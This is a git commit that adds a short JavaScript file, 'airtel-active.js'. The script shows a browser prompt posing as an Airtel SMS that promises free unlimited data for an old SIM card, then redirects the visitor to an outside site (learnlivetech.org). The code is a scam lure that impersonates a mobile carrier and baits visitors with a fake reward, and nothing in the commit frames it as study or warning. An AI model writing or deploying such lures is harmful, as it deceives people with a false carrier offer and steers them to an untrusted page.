312a17cbbee7cb1d9e57d16866798bf9a0766f0f
bigukpe <bigaka42@gmail.com>
2025-06-16 07:54:36 +0100

    Create airtel-active.js

---
+++ airtel-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE UNLIMITED DATA'
+password=prompt('SMS: Congratulations, your Airtel SIM card is eligible to receive free data old sim card reward, click OK to activate now','ACTIVATE UNLIMITED DATA');
+if (password != 'ACTIVATE UNLIMITED DATA') {
+location.href='https://learnlivetech.org/airtel.html';
+}
